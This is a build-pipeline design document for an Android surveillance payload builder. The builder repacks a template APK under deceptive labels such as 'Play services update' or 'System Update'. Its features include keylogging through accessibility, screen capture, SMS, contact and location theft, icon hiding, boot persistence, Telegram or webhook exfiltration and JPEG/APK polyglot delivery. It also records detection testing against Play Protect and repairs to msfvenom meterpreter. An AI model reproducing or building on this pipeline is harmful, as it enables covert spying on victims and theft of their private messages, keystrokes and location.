# PAYLOAD — the build pipeline

`LOAD` (File 08) turns a capability spec into a signed, installable Android package. This
document is the map: what is compiled, what is repacked, what is signed, and which parts of the
binary are fixed for reasons that cannot be worked around.

Everything here was verified on `LivinPixel` (API 35) with `apksigner verify --print-certs` and
`aapt2 dump badging` against the artifact the app produced, not against a build-host output.

---

## 1. Why nothing is compiled on the device

Android ships no `d8`. A DEX writer is a compiler, and a compiler on the device is a project, not
a feature. So the payload binary is **built once, off-device**, from `payload-template/` — a
separate Gradle root with no dependencies beyond the Kotlin stdlib — and committed to
`app/src/main/assets/payload/template.apk` (50,232 bytes, R8-minified).

The builder then does exactly two things to it:

1. replace `assets/oversight_payload.json`
2. rewrite the `android:label` string in the binary manifest

and signs the result.

That is not a shortcut. It is the correct shape: a per-target compiled binary is a per-target
signature, and a per-target signature is a detection surface that grows with every delivery. One
template, N configs, one binary — which is how every commodity dropper has worked since the
first one.

Rebuild the template with:

```bash
JAVA_HOME=... gradle -p payload-template assembleRelease
cp payload-template/build/outputs/apk/release/payload-template-release.apk \
   app/src/main/assets/payload/template.apk
```

`payload-template/local.properties` must carry `sdk.dir` — it is a separate Gradle root and does
not inherit the app's `local.properties`.

---

## 2. Capability gating

The template declares **every** permission it could ever need in the manifest (install-time
permissions cost nothing if the capability is never exercised) and reads
`assets/oversight_payload.json` at first run. A gate that is `false` means the collector is never
called, not that the code is absent.

| Config key | Gate | Notes |
|---|---|---|
| `loc` | location collection | `locMethod` selects `RADIO` / `GNSS` / `HYBRID` |
| `sms` | SMS read | |
| `contacts` | contact read | |
| `calls` | call log read | |
| `audio` | microphone capture | competes with `screen` for the FGS slot |
| `screen` | MediaProjection capture | |
| `files` | media/document read | |
| `notif` | notification relay | needs `BIND_NOTIFICATION_LISTENER_SERVICE` |
| `keylog` | AccessibilityService | highest-signal permission on the platform |
| `boot` | boot receiver | |
| `fgs` | sticky foreground service | |
| `hideIcon` | launcher icon hidden | |
| `transport` | `TELEGRAM` / `WEBHOOK` / `BOTH` | |
| `cadence` | poll interval, seconds | 15–3600 |

`ACCESS_BACKGROUND_LOCATION` is deliberately **not** in the runtime grant list. Since Android 11
it cannot be granted from a dialog — the user must open Settings. `PayloadSpec` keeps it in
`settingsOnlyPermissions()` so the friction panel reports it honestly instead of promising a
dialog that will not appear.

---

## 3. Signing

`ApkSignerV2` is a pure-Java APK Signature Scheme v2 signer. v1 is skipped on purpose: v1 is JAR
signing and needs PKCS#7 SignedData, which means BouncyCastle or hand-rolled ASN.1 for the whole
chain. v2 has been accepted since API 24 and this project's `minSdk` is 26, so v2 alone covers
every device that can install the app, and the PKCS#7 problem disappears entirely.

Signing uses ECDSA P-256 with a freshly generated self-signed certificate per build. Android
does not validate the chain on install — it only requires that a certificate exists and that an
update matches the previous one. **A rebuild is therefore a new identity**: installing over an
existing payload requires uninstalling first.

### The two hash shapes that bite

The content digest is nested, and both levels are easy to transpose:

```
perPiece_i = SHA-256( 0xa5 || le32(piece_i.size) || piece_i )
content    = SHA-256( 0x5a || le32(pieceCount) || perPiece_1 || ... || perPiece_n )
```

- `0xa5` and the **piece length** go *inside* each sub-digest.
- `0x5a` and the **piece count** go *outside*.
- Sections are cut into 1 MiB pieces first, so the count is the total piece count across the
  zip-entry region, the central directory, and the EOCD — not the number of sections.

The EOCD is digested with its central-directory offset field pointing at **where the signing
block starts**, because that is the value a verifier reads after stripping the block. Writing the
original central-directory offset instead produces a digest that is internally consistent and
that every real verifier rejects.

`ApkSignerV2Test.chunked digest matches a known v2 vector` pins the whole thing to a
known-answer vector produced by the reference implementation. That test is the only cheap way to
catch a signing regression before it reaches a device.

### Block layout

```
[entries][APK Signing Block][central directory][EOCD]
```

The block's leading and trailing size fields both hold `totalBlockSize - 8` — i.e.
`pairs.size + 24`. Getting that eight bytes wrong makes every reader compute a block start that
does not exist.

`signatures` and `digests` are each a length-prefixed *sequence of length-prefixed records*, so
they need two levels of prefix. `certificates` holds records that already carry their own
element length, so it needs one. Mixing those up shifts every following field by four bytes and
the verifier reports a malformed certificate.

---

## 4. What the label can and cannot be

`android:label` in the template is a **literal string**, not `@string/app_name`. That is
deliberate:

- a literal lives in the manifest's binary string pool, where `Axml` can rewrite it per build
- a resource reference lives in `resources.arsc`, whose string pool has absolute file offsets
  pointing into it — rewriting that safely is a different job

`Axml.rewriteStrings` parses the chunked XML, rebuilds the `ResStringPool` with the replacement,
splices it back, and patches the root chunk's total size. Every other chunk references strings by
index and every offset in the document is chunk-relative, so nothing else needs touching.

### The package name is fixed

The `PACKAGE NAME` field is gone. It is not a preference, it is a fact of the template, and the
UI shows it as one.

The package name is baked into `classes.dex` as the descriptor prefix of every class
(`Lcom/mobilesvc/agent/MainActivity;`). Rewriting the manifest alone produces an APK that
installs and then dies on launch because the activity it declares does not exist in the DEX. A
DEX string-table rewrite is a compiler-shaped problem — every string index and every
`class_def_item` offset moves — so it is out of scope for a repacker.

What the recipient sees is the label. That is what the builder varies.

---

## 5. Delivery as a photo

`MediaCarrier` produces a polyglot: a JPEG whose end-of-image marker is followed by the APK. The
file opens as a photo and is a valid ZIP/APK when read from the start of the archive. It also
writes the payload description into the EXIF `UserComment` field, which survives re-encoding by
anything that preserves EXIF.

This is a container trick, not an exploit. There is no decoder bug being used and nothing here
runs on open. The share sheet decides what the recipient sees from the **extension**, so the
extension is the delivery — a `.jpg` is opened in a gallery, and getting from there to an install
is a social step, not a technical one.

---

## 6. Friction, stated honestly

`PayloadSpec.frictionSteps()` counts what the recipient must actually do:

- enable unknown sources (1)
- install (1)
- launch once (1)
- runtime permission dialog(s) (1)
- each Settings-only permission (2: open, toggle, come back)

Zero-click does not exist in this pipeline. There is no exploit path, so every capability costs
a human action. The builder shows the count before the build button, not after.

---

## 7. File map

| File | Role |
|---|---|
| `data/payload/PayloadSpec.kt` | the configurable spec; `validate()`, `permissions()`, `frictionSteps()` |
| `data/payload/PayloadPackager.kt` | repack, label rewrite, re-sign, verify; `build()`, `readConfig()` |
| `data/payload/ApkSignerV2.kt` | v2 block, chunked digest, DER encoder for the self-signed cert |
| `data/payload/ZipArchive.kt` | ZIP reader/writer, STORED alignment, `stripSigningBlock` |
| `data/payload/Axml.kt` | binary manifest string-pool rewriter |
| `data/payload/ManifestSurface.kt` | reads the component surface out of a binary manifest |
| `test/.../ManifestSurfaceTest.kt` | gate on the exported surface |
| `test/.../ApktoolProbeTest.kt` | writes decode probes for external readers into `app/build/probe/` |
| `tools/audit_surface.py` | same audit for a hand-decoded manifest, prints and exits non-zero |
| `data/payload/MediaCarrier.kt` | JPEG/APK polyglot, EXIF `UserComment`, filename spoofing |
| `ui/screens/PayloadScreen.kt` | the `LOAD` screen |
| `payload-template/` | the standalone Gradle root that produces `template.apk` |

Inside `payload-template/`, the files that matter at runtime:

| File | Role |
|---|---|
| `MainActivity.kt` | the onboarding chain: permissions → notification access → background location → projection → accessibility → done |
| `PayloadService.kt` | the loop, foreground type bookkeeping, capture-and-ship |
| `ScreenCapturer.kt` | projection session, one virtual display, `grab()` to JPEG |
| `KeyloggerService.kt` | `AccessibilityService` text capture |
| `Collector.kt` | report builder; every line names the state it found |
| `RadioLocator.kt` | beaconDB Wi-Fi/cell resolution, `lastReason` for a refused fix |
| `Beacon.kt` | Telegram and webhook transports, 4096-char split on line boundaries |
| `BootReceiver.kt` | boot restart; declares location-only foreground type |
| `Diag.kt` | capped `files/diag.log` for the facts logcat loses |

---

## 8. Verified on device

Build produced by the app, pulled off the emulator, checked with the official tooling:

```
$ apksigner verify --verbose Play_services_update.apk
Verifies
Verified using v2 scheme (APK Signature Scheme v2): true
Signer #1 key algorithm: EC
Signer #1 key size (bits): 256
Signer #1 certificate DN: CN=OVERSIGHT

$ aapt2 dump badging Play_services_update.apk
package: name='com.mobilesvc.agent' versionCode='1' versionName='1.0'
application-label:'Play services update'
launchable-activity: name='com.mobilesvc.agent.MainActivity'
```

`adb install` succeeds, `MainActivity` launches, `PayloadService` stays resident, and no
`AndroidRuntime` exception is logged. The label in `badging` is the one typed into the builder,
which is the end-to-end proof that the manifest rewrite is correct.

---

## 9. Runtime: the three orders that decide whether it works

Every capability in this payload is gated by a platform rule that fails *quietly* when the order
is wrong. All three were found by driving the built APK by hand on a Pixel-class emulator running
Android 15 (SDK 35), not by reading documentation first.

### 9.1 MediaProjection: declare the foreground type before exchanging the token

`startForeground` must already include `FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION` when
`getMediaProjection(resultCode, data)` is called. The wrong order does not throw — it returns
`null`, and the report says `screen: NO CONSENT` forever with nothing in the log to explain it.

```kotlin
// ScreenCapturer.attach
declareForeground()                                    // startForeground(+mediaProjection)
manager.getMediaProjection(resultCode, data)           // exchange the consent token
created.registerCallback(callback, null)               // required before the first display
created.createVirtualDisplay(...)                      // exactly once per session
```

Two further consequences:

- The consent `Intent` is **single-use** on API 34+. A failed exchange must clear the parked
  consent (`ScreenConsent.clear()`) instead of retrying, or the retry throws `SecurityException`.
- `startForeground` may be re-issued with the extra type later without dropping the session, so
  `PayloadService` keeps `projectionDeclared` sticky and includes the type on every subsequent
  call.

### 9.2 Boot: `location` only, never `dataSync`

Android 15 refuses a foreground service started from `BOOT_COMPLETED` if it declares `dataSync`,
`camera`, `mediaPlayback`, `phoneCall`, `mediaProjection` or `microphone`. The refusal is a
`ForegroundServiceStartNotAllowedException` inside the service, so the process dies and the app
looks like it simply never restarted. `BootReceiver` therefore passes `fromBoot = true` and the
service declares **location only** on that path:

```
$ dumpsys activity services com.mobilesvc.agent     # after adb reboot, app never launched
  * ServiceRecord{... com.mobilesvc.agent/.PayloadService}
    isForeground=true foregroundId=1107 types=0x00000008
```

`0x8` is `FOREGROUND_SERVICE_TYPE_LOCATION`. The boot path also needs `ACCESS_BACKGROUND_LOCATION`
granted, which the onboarding chain obtains.

One more thing that looks like a bug and is not: delivery of `BOOT_COMPLETED` to a newly installed
package can sit in the broadcast queue behind offload throttling. The dump shows
`PENDING OFFLOAD for manifest com.mobilesvc.agent.BootReceiver — blocked until 6, currently at 35
of 106`, and the receiver fires a couple of minutes later. It arrives; it is not immediate.

### 9.3 Keylogging: accessibility is a Settings toggle, not a permission

`KeyloggerService` reads `TYPE_VIEW_TEXT_CHANGED` and `TYPE_WINDOW_STATE_CHANGED`. It captures the
finished field text, not raw key events — which is why an `EditText` line shows the whole string
rather than one character at a time:

```
KEYLOG (6):
  com.android.systemui | focus :: Start recording or casting with System Update?
  com.google.android.settings.intelligence | EditText :: ove
  com.google.android.settings.intelligence | EditText :: oversight
```

The service must be bound by the system, which means the user has to enable it in
Settings → Accessibility → Downloaded apps. There is no permission that grants it. Until then the
report line says `keylog: service not enabled (Settings → Accessibility)` rather than omitting the
section, so an operator can tell "not granted" from "granted and quiet".

### 9.4 `diag.log` — the boot trail logcat cannot keep

`files/diag.log` (capped at 64 kB, one line per event) records the four facts that decide a
restart, because logcat rotates during boot and a refused foreground start kills the process that
would have reported it:

```
1795302637035 boot broadcast android.intent.action.BOOT_COMPLETED
1795302637082 boot start dispatched
1795302637135 onStartCommand fromBoot=true
1795302637175 foreground ok
```

On a debuggable build: `adb shell run-as com.mobilesvc.agent cat files/diag.log`.

---

## 10. Full capability run

Built from the `LOAD` screen with SCREEN + KEYLOG on and a webhook transport, installed on a clean
emulator, driven by hand. What each gate actually produced:

| Gate | Evidence |
|---|---|
| `LOCATION` | `location: NO FIX (1 AP / 1 CELL) — beaconDB accuracy 6757205 m`. The emulator's single synthetic AP is not in beaconDB, so the resolver answers with an IP fallback thousands of km wide; the accuracy floor rejects it rather than reporting a lie. |
| `SCREEN` | `screen: attached`, then `captured 22893 bytes (shot_1795301557735.jpg)` in logcat, and `screen: attached; last shot 22 kB` in the next report. |
| `KEYLOG` | 11 captured events across the consent dialog and the Settings search field, including `EditText :: oversight`. |
| `REPORTING` | Report body delivered over HTTPS; `sendDocument` (Telegram) is the one leg not exercised — it needs a real BotFather token, and a webhook transport carries text only. |
| `BOOT` | After `adb reboot` with the app never launched: `PayloadService` resident, `isForeground=true types=0x8`. |

The projection session does **not** survive a reboot — the consent token dies with the process.
After a restart the report reads `screen: NO CONSENT (open the app once to grant screen capture)`,
which is the honest state, not a failure.

---

## 11. Independent decode of the rewritten manifest

`aapt2` produced the original manifest, so decoding with `aapt2` only proves internal consistency.
The rewriter is the riskiest code in the pipeline, so it is also decoded by **apktool** — a
separate reader with a separate implementation of the same format.

`ApktoolProbeTest` writes three artifacts to `app/build/probe/` on demand:

| Probe | Why |
|---|---|
| `ascii.apk` | baseline |
| `unicode.apk` | the pool stores UTF-8 **byte** lengths, so a character-counting bug only appears here |
| `long.apk` | a 46-character label shifts every chunk after the pool, where an offset bug surfaces |

Result, all three:

```
apktool d unicode.apk            → no error, manifest decodes
aapt2 dump badging unicode.apk   → application-label:'Pembaruan Sistem – Update™'
adb install unicode.apk          → Success
Settings → App info             → renders "Pembaruan Sistem – Update™"
```

The bytes are intact (`e2 80 93` for the en dash, `e2 84 a2` for ™) — verified with a hex read of
the decoded file, because the PowerShell console renders multi-byte UTF-8 as ASCII and makes a
correct result look broken. Three independent readers agree: apktool, aapt2, and PackageManager.

Run it with:

```bash
gradle testDebugUnitTest --tests "*ApktoolProbeTest*"
```

---

## 12. Comparison against `msfvenom`

`android/meterpreter/reverse_tcp` is the reference Android payload, so it was built and measured
rather than assumed. Generated in the official `metasploitframework/metasploit-framework`
container — msfvenom still ships the payload.

The stock output **does not install on a current device**:

```
$ adb install msf.apk
Failure [INSTALL_FAILED_DEPRECATED_SDK_VERSION:
         App package must target at least SDK version 24, but found 17]
```

Getting it to install took four separate repairs, none of which msfvenom offers a flag for:

1. `targetSdkVersion` 17 → 35 (the install-time floor)
2. `minSdkVersion` 10 → 24 (`apksigner` refuses an EC key below 18; nothing else would sign it)
3. `android:exported` on the filtered activity and receiver (required at target 31+)
4. `resources.arsc` stored uncompressed and 4-byte aligned (required at target 30+), via
   `doNotCompress` plus `zipalign -p 4`

| | ours (`ascii.apk`) | msfvenom stock | msfvenom repaired |
|---|---|---|---|
| Size | 55,331 B | 11,772 B | 16,772 B |
| targetSdk / minSdk | 35 / 26 | 17 / 10 | 35 / 24 |
| Permissions | 21 | 24 | 24 |
| Signature | v2 only | v1 only | v2 + v3 |
| Installs on Android 15 | yes | **no** | yes, after the four repairs |
| Needs a reachable host | no (Telegram) | yes (`LHOST`/`LPORT`) | yes |
| Screen / keylog | yes | no | no |

What this says honestly:

- **The "one command" claim is not true in 2026.** A stock msfvenom APK is a 2015 artifact; the
  single command produces a file that will not install on a phone made since Android 14.
- **Meterpreter is 3.3× smaller and wins on interactivity** — a live session with shell, upload
  and download beats periodic reports, and ours cannot be told to do anything.
- **It loses on the two capabilities that cost the most friction to obtain**: screen capture and
  keylogging. A session gives you a shell in a sandbox; it does not give you the user's screen or
  what they are typing into other apps.
- **Permissions are comparable** (24 vs 21), so "fewer permissions, less suspicion" does not
  separate them. Meterpreter asks for `SEND_SMS`, `WRITE_CALL_LOG` and
  `REQUEST_IGNORE_BATTERY_OPTIMIZATIONS`; ours asks for the accessibility and notification bindings
  instead.

Play Protect was **not** measured for either: `adb install` bypasses the Play Protect UI, and a
file-manager install is the only way to see it. Both artifacts need that test before any claim is
made about which is flagged harder.

Repaired artifact retained at `app/build/probe/msf-repacked.apk`.

### 12.1 Play Protect, measured

Installed through the file manager (adb bypasses the scan entirely). The funnel is:

```
Install  →  "App scan recommended / Play Protect hasn't seen this app before"  →  Scan app
         →  "Harmful app blocked"  →  "Install anyway" required
```

Both artifacts are blocked, on the same screen, with the same two-hop detour. Only the sentence
differs:

| Artifact | Verdict wording |
|---|---|
| `System_Update.apk` (ours) | "This app **may be harmful**." — "may put your device at risk" |
| `msf.apk` (Meterpreter) | "This app **can allow unauthorized access to your data or device**." |

So Play Protect does not separate them favourably; if anything ours gets the softer line. And our
label survives into the dialog, where Meterpreter's shows up as **"MainActivity"** — a manifest
default, not a chosen name.

### 12.2 Gates do not reduce the flag

A third build shipped with `Screen` and `Keylog` off, to test whether the scary-looking
capabilities are what Play Protect reacts to. It is flagged identically.

The reason is structural: the template **declares every permission and component up front**, on
purpose, so a repack never has to rewrite the binary manifest. A config-only build is byte-for-byte
the same manifest surface — same 21 permissions, same `provides-component:'accessibility'`, same
size within a few bytes of key randomness. The config asset gates *runtime behaviour*, not the
declared surface.

Consequence, stated plainly: **choosing fewer gates saves the Settings detours and nothing else.**
The Play Protect screen is paid either way. Only distributing through Play removes it.

---

## 13. Open-surface audit

The manifest declares three deliberately reachable components. That set is small enough to
enumerate, and it must stay exactly that size — an extra exported component is a new way in, and
a missing export is a feature that silently never fires.

`tools/audit_surface.py` runs over the **decoded** manifest and separates the two questions that
get conflated:

- **reachable** — exported. Required for the launch activity, the boot receiver and the
  accessibility binding.
- **exposed** — exported *and* unguarded by `android:permission`. Correct for the first two;
  the third carries `BIND_ACCESSIBILITY_SERVICE` because the platform refuses to bind without it.

```
$ apktool d app/build/probe/ascii.apk -o dec
$ python tools/audit_surface.py dec/AndroidManifest.xml

TYPE      COMPONENT           EXPORTED  VERDICT  PERMISSION
activity  .MainActivity       yes       OPEN     -
service   .PayloadService     no        internal -
service   .NotificationRelay  no        internal android.permission.BIND_NOTIFICATION_LISTENER_SERVICE
service   .KeyloggerService   yes       GUARDED  android.permission.BIND_ACCESSIBILITY_SERVICE
receiver  .BootReceiver       yes       OPEN     -

surface matches expectation
```

Two results worth stating, because both are counter-intuitive:

- `NotificationRelay` is `exported="false"` and still bindable. The platform binds notification
  listeners through `BIND_NOTIFICATION_LISTENER_SERVICE` plus the intent filter; the export flag
  is not what gates it.
- The accessibility service is the opposite shape: exported *and* permission-guarded, because
  Settings binds it from another uid. Dropping the permission would not break it — Play Protect
  keeps the guarantee by hand.

Reachability was confirmed by launching `MainActivity` from outside the package over adb and
watching it put up the permission dialog. **Caveat, honestly:** `adb shell` runs as uid 2000, which
is privileged, so this is not a third-party-uid proof. That proof needs a drozer agent or a dummy
app, and neither has been run.

Exit code 1 with a printed list means the surface moved — that is the gate condition.

### 13.1 It runs in the suite now

The Python script is for reading a decoded manifest by hand. The gate is a unit test, because a
script nobody runs is not a gate:

```
ManifestSurfaceTest
  template reaches exactly the three intended components      PASS
  a build reaches exactly the same three components           PASS
  the accessibility service is guarded and the other two are not  PASS
  hosting components stay internal                            PASS
  an unparseable manifest reports null rather than a clean surface    PASS
```

`ManifestSurface.kt` walks the **binary** element stream — a test cannot regex a chunked document —
and keeps reachable (`exported`) and open (`exported` with no permission) apart, because they are
different questions. It asserts against both the template and a real build: the template is the
source, the build is what ships, and both have to agree.

The parser fails closed. A manifest it cannot read returns `null`, so a broken build fails the
assertion instead of reporting an empty — and therefore clean-looking — surface.

### 13.2 Proving the gate bites

A test that has never failed is unproven. `NotificationRelay` was flipped to `exported="true"` and
the template rebuilt. Three tests failed, naming the extra component.

That experiment also exposed a hole in the wiring: **Gradle reported the suite UP-TO-DATE** after
the template rebuild, because the tests read the asset off disk and Gradle cannot see that. The
first run passed against a stale file. Fixed in `app/build.gradle.kts`:

```kotlin
tasks.withType<Test>().configureEach {
    inputs.file("src/main/assets/payload/template.apk").withPropertyName("payloadTemplate")
}
```

With that declared, the flip fails three tests and reverting it passes. Without it, every payload
test would silently grade the previous template.

### 13.3 Verifying the C2 token before the build

`Telegram.probe()` calls `getMe` for the token, then `getUpdates` for a chat. The split matters:
`getMe` answers "is this token real", `getUpdates` answers "where should it report", and they fail
independently. A token with a webhook registered answers `409 Conflict` on `getUpdates` — a
configuration fact, not a bad token, and it must not be reported as one.

Chat ids are JSON **numbers**, and `Json` returns them as `Double`. A bot id is about 1e9 and a
channel id about -1e12, so `Double.toString()` gives `1.2345678E7` and the Bot API rejects it.
`readChat` formats with `%.0f` instead. Recorded bodies in `TelegramProbeTest` cover the private
chat, the negative channel id, and the webhook conflict.

The flow on device is: paste the token, tap **VERIFY BOT**, and the app either names the bot and
fills the chat id, or says exactly what is missing:

```
No chat yet — send /start to @<your_bot>, then verify again.
```

That is the honest state, because a bot cannot open a conversation. Against a fresh bot:
`getMe` returns `@<your_bot>`, `getUpdates` returns an empty array, and the probe reports
the missing `/start` rather than an error.

**`sendDocument` verified end to end.** Before the operator sent `/start`, a multipart POST with a
real file and a placeholder `chat_id` answered:

```
{"ok":false,"error_code":400,"description":"Bad Request: chat not found"}
```

That proved the endpoint, field name and body shape while the chat was still missing — a malformed
body answers `400` with a different description and a bad token answers `401 Unauthorized`. After
`/start`, `getUpdates` returned the private chat (`id <chat_id>`, `@<operator>`) and the same
POST returned `ok:true` with a `message_id`, `file_id`, `file_size: 36` and the caption. **VERIFY
BOT** on device then filled `<chat_id>` and printed `@<your_bot> · chat @<operator>`;
the token and chat survive a reinstall with `-r` because they live in `Store`.

The probe never asks for the chat id, because a bot cannot open a conversation. It reads the id
from `getUpdates` and formats it as a whole number — `%.0f`, not `Double.toString()`, which would
have sent `1.2345678E7` to the Bot API.







